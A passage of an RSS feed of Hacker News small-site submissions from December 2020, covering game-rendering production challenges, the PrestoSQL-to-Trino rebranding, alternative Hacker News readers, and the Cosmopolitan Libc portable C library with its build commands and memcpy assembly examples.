            Create flashcards with <strong data-v-28a2eea8="">images</strong>, <strong data-v-28a2eea8=""> latex</strong>, <strong data-v-28a2eea8=""> code</strong>, <strong data-v-28a2eea8=""> languages </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/reminder.2a2f3d4.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            We help <strong data-v-28a2eea8="">reminding</strong> you to study
          </p></div></div></div>]]>
            </description>
            <link>https://memordo.com/m/h</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558420</guid>
            <pubDate>Mon, 28 Dec 2020 11:34:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics challenging? Productionizing rendering algorithms]]>
            </title>
            <description>
<![CDATA[
Score 296 | Comments 83 (<a href="https://news.ycombinator.com/item?id=25557431">thread link</a>) | @bartwr
<br/>
December 27, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557431</guid>
            <pubDate>Mon, 28 Dec 2020 07:26:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We’re Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557321">thread link</a>) | @addisonj
<br/>
December 27, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557321</guid>
            <pubDate>Mon, 28 Dec 2020 06:55:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HN Alternative UIs]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 108 (<a href="https://news.ycombinator.com/item?id=25556990">thread link</a>) | @lgats
<br/>
December 27, 2020 | https://blog.luke.lol/tech/hacker-news-alternatives/ | <a href="https://web.archive.org/web/*/https://blog.luke.lol/tech/hacker-news-alternatives/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<h2>News.YCombinator.com Readers</h2>
<p>Ranked by Alexa popularity.</p>
<p><a href="https://hn.algolia.com/">hn.algolia.com</a><br>
HackerNews with a search function and 16.8+ million posts indexed.<br>
Alexa: 8.7k</p>
<p><a href="http://popurls.com/">popurls.com</a><br>
Several news sites combined into a single newspaper-like feed<br>
Alexa: 87k</p>
<p><a href="https://upstract.com/">upstract.com</a><br>
News aggregator with paid features, includes HN<br>
Alexa: 137k</p>
<p><a href="https://hckrnews.com/">hckrnews.com</a><br>
HN posts organized by rolling, quarter-daily timeslots.<br>
Alexa: 178k</p>
<p><a href="https://pxlet.com/">pxlet.com</a><br>
Culmination of HN, Reddit, SlashDot, and other Tech-News Sites<br>
Alexa: 330k</p>
<p><a href="https://hackernewsletter.com/">hackernewsletter.com</a><br>
HN delivered via email<br>
Alexa: 581k</p>
<p><a href="https://old.thenews.im/">thenews.im&nbsp;</a><br>
Designer News, Product Hunt and Hacker News Mashup with easy-access to individual feeds<br>
Alexa: 960k</p>
<p><a href="http://www.daemonology.net/hn-daily/">daemonology.net</a><br>
Daily list of the top HN posts.<br>
Alexa: 971k</p>
<p><a href="http://n-gate.com/%3En-gate.com%3C/a%3E%3Cbr%20/%3EA%20weekly%20[human?]%20annotated%20digest%20of%20the%20top%20%E2%80%9CHacker%E2%80%9D%20%E2%80%9CNews%E2%80%9D%20posts%3Cbr%20/%3EAlexa:%202.5m%3C/p%3E%3Cp%3E%3Ca%20href=" https:="" hn.premii.com"="">hn.premii.com</a><br>
HN Mirror integrated with an on-page reader<br>
Alexa: 3m</p>
<p><a href="http://hnrankings.info/">hnrankings.info</a><br>
HN Ranking Charts<br>
Alexa: 4m</p>
<p><a href="https://hnews.xyz/">hnews.xyz</a><br>
HN Mirror with Webpage Screenshots [similar to tiledhn.com (<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">RIP</a>)]<br>
Alexa: 5m</p>
<p><a href="https://hnsince.com/">hnsince.com</a><br>
Top HN posts since you last visited<br>
Alexa: 5.4m</p>
<p><a href="https://hackerweb.app/">hackerweb.app</a><br>
More mobile-friendly HN<br>
Alexa: 6.3m</p>
<p><a href="https://fullhn.com/">fullhn.com</a><br>
Front page of HN in a single page loaded with all articles. Great for loading up before you jump on a flight without wireless access.<br>
Alexa: 7m</p>
<p><a href="https://hackurls.com/">hackurls.com</a><br>
HN, proggit, reddit, toptal, hackaday, slashdot, techmeme, wired as separate feeds on a single page<br>
Alexa: 8.5m</p>
<p><a href="https://hackernewsmobile.com/">hackernewsmobile.com</a><br>
More mobile-friendly HN<br>
Alexa: 9.5m</p>
<p><a href="https://lopespm.github.io/hackernews-daily/">lopespm HN Daily</a><br>
HackerNews Daily – Culmination of top posts for the day<br>
Alexa: Unavailable</p>
<p><a href="https://www.wolfgangfaust.com/project/paper-hn/">wolfgangfaust HN Newspaper</a><br>
Newspaper themed HN<br>
Alexa: Unavailable</p>
<p><a href="https://thn.rakhim.org/">thn.rakhim.org</a><br>
30 random good HN posts from the past<br>
Alexa: Unavailable</p>
<p><a href="https://zvoid.org/hn">zvoid.org/hn</a><br>
Dark-themed HN reader<br>
Alexa: Unavailable</p>
<p><a href="https://hn.svelte.dev/">hn.svelte.dev</a><br>
mobile and dark mode friendly reader for HN<br>
Alexa: None</p>
<p><a href="https://hackernews.betacat.io/">hackernews.betacat.io</a><br>
Modern HN theme with website preview screenshots<br>
Alexa: None</p>
<p><a href="https://read.hn/">read.hn</a><br>
Another HN Reader view<br>
Alexa: None</p>
<p><a href="https://hnapp.com/">hnapp.com</a><br>
HN Advanced Search and monitoring tool<br>
Alexa: None</p>
<p><a href="http://hnpaper.forge.partlab.io/">hnpaper.forge.partlab.io</a><br>
HNPaper – bootstrap theme simple HN interface<br>
Alexa: Unavailable</p>
<p><a href="https://hack.ernews.info/">hack.ernews.info</a><br>
More mobile-friendly HN<br>
Alexa: None</p>
<p><a href="https://progscrape.com/">progscrape.com</a><br>
HN, Reddit, and Lobste.rs aggregated and merged into a single feed<br>
Alexa: None</p>
<p><a href="http://hn.elijames.org/">hn.elijames.org</a><br>
“Less annoying hacker news” with an even simpler interface<br>
Alexa: None</p>
<p><a href="http://serializer.io/">seralizer.io</a><br>
HN + Related Subreddits + Lobsters + Mac Rumors + Arstechnica<br>
Alexa: None</p>
<p><a href="https://nerdmash.com/">nerdmash.com</a><br>
A nerd’s daily read. Top posts from every nerdy content aggregator.<br>
Alexa: None</p>
<h2>Other Tweaks / Interfaces</h2>
<p><a href="https://old.reddit.com/r/hackernews/">/r/hackernews</a><br>
Subreddit for HN<br>
51,450 readers</p>
<p><a href="https://hnreplies.com/">hnreplies.com</a><br>
Emails on replies to your comments<br>
Alexa: 3.2m</p>
<p><a href="https://apps.apple.com/us/app/id1308885491">Octal iOS App</a><br>
Full-featured HN client with support for posting/voting/comments – iOS only.<br>
4.8/5.0 – 1K Ratings</p>
<p><a href="https://hnrss.github.io/">hnrss.github.io</a><br>
HN RSS Feed<br>
Alexa: None</p>
<p><a href="https://hackerne.ws/">hackerne.ws</a><br>
HN Short Link – redirects to https://news.ycombinator.com<br>
Alexa: None</p>
<p><a href="https://chrome.google.com/webstore/detail/hacker-news-ux/chngbdmhgakoomomnnhfapkpbalpmhid">Hacker News UX</a><br>
Chrome Extension for Improved UI<br>
356 users</p>
<p><a href="https://f5bot.com/">f5bot.com</a><br>
Reddit / HN / Lobsters keyword mention watch tool.<br>
Alexa: 1.1m</p>

<h2>Graveyard</h2>
<p>hackermonthly.com [<a href="https://web.archive.org/web/20160731192600/http://hackermonthly.com/">defunct</a>]<br>
HN in print</p>
<p>quiethn.com [<a href="https://web.archive.org/web/20171001013212/https://quiethn.com/">defunct</a>]<br>
HN with less clutter </p>
<p>hackerblogs.com [<a href="https://web.archive.org/web/20110204021331/http://www.hackerblogs.com/">defunct</a>]<br>
2011-era mobile view</p>
<p>hackernews.im [defunct]<br>
now <a href="https://hackernews.betacat.io/">hackernews.betacat.io</a></p>
<p>tiledhn.com [<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">defunct</a>]<br>
Windows 8-type view for HN</p>
<p>hackerbra.in [<a href="https://web.archive.org/web/20181105131330/http://hackerbra.in/">defunct</a>]<br>
HN with inline top comments </p>
<p>hnwatcher.com [<a href="https://web.archive.org/web/20201125052525/https://www.hnwatcher.com/">defunct</a>]<br>
user/keyword email notification service</p>
<p>hnmobile.herokuapp.com [<a href="https://web.archive.org/web/20180601000346/http://hnmobile.herokuapp.com/">defunct</a>]<br>
HN mobile friendly mirror</p>
<p>hackernewsemail.com [<a href="https://web.archive.org/web/20180826215821/https://hackernewsemail.com/">defunct</a>]<br>
Daily email for posts with minimum set number of points</p>
<p>hacker-newspaper.gilesb.com [<a href="https://web.archive.org/web/20180402131152/https://news.ycombinator.com/">defunct</a>]<br>
HN Mirror</p>
<p>react-hn.appspot.com [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror</p>
<p>hackeroo.co [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror </p>
</div></div>]]>
            </description>
            <link>https://blog.luke.lol/tech/hacker-news-alternatives/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556990</guid>
            <pubDate>Mon, 28 Dec 2020 05:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cosmopolitan Libc: build-once run-anywhere C library]]>
            </title>
            <description>
<![CDATA[
Score 589 | Comments 162 (<a href="https://news.ycombinator.com/item?id=25556286">thread link</a>) | @pantalaimon
<br/>
December 27, 2020 | https://justine.lol/cosmopolitan/index.html | <a href="https://web.archive.org/web/*/https://justine.lol/cosmopolitan/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <img width="196" height="105" src="https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png" title="cosmopolitan honeybadger" alt="honeybadger">
  
  <span>build-once run-anywhere c without devops</span>
</header>

<nav>
  <ul>
    <li><a href="https://justine.lol/cosmopolitan/index.html">Intro</a>
    </li><li><a href="https://justine.lol/cosmopolitan/download.html">Download</a>
    </li><li><a href="https://justine.lol/cosmopolitan/documentation.html">Documentation</a>
    </li><li><a href="https://justine.lol/cosmopolitan/sources.html">Sources</a>
    </li><li><a href="https://github.com/jart/cosmopolitan">GitHub</a>
    </li><li><a href="https://justine.lol/cosmopolitan/license.html">License</a>
    </li><li><a href="https://justine.lol/index.html">» jart's web page</a>
  </li></ul>
</nav>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
